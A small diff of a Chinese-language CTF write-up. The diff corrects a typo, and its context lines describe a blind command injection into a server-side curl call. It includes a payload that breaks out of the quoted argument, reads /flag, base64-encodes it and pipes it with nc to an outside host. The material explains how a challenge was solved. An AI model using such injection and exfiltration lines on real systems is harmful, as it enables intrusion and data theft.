@@ -85,7 +85,7 @@ OK，成功了
 
 所以猜測他背後應該是長這樣：`system("curl 'https://youtube.com/xxxx/$myinput'")`
 
-但沒有回險，所以我們要把資料傳出來
+但沒有回顯，所以我們要把資料傳出來
 
 可以這樣：`';cat /flag | base64 | nc ctf.kaibro.tw 5566;'`
 
